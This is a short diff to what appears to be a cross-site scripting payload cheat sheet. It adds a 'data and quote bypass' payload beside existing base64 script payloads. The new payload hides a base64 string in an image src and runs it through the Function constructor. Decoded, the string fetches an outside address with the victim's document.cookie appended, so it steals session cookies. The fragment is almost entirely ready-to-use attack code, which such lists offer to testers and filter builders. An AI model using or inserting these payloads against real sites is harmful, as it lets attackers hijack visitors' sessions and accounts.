@@ -369,6 +369,11 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
+XSS with data and quote bypass:
+```javascript
+<img src=9999ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjAuMTAwLycrYnRvYShkb2N1bWVudC5jb29raWUpKQ== onerror=[].constructor.constructor(atob(document.images[0].src.split(9999)[1]))()>
+```
+
 XSS with vbscript: only IE
 
 ```javascript
